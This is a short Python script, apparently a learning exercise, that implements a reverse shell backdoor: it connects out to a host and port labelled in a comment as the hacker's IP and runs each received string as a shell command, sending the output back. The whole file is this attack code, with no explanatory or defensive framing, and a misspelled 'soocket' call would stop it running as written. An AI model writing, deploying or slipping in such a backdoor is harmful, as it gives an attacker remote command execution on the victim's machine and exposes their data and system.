#!/usr/bin/env python
import socket
import subprocess

def execute_system_command(command):
    return subprocess.check_output(command, shell=True)

# connection
connection = soocket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection.connect(("192.168.0.34", 4444)) #hackers_ip, socket to transfer data

connection.send("\n\n[+] Connection established\n\n")

while True:
    recieved_data = connection.recv(1024)
    command_result = execute_system_command(recieved_data)
    connection.send(command_result)


connection.close()
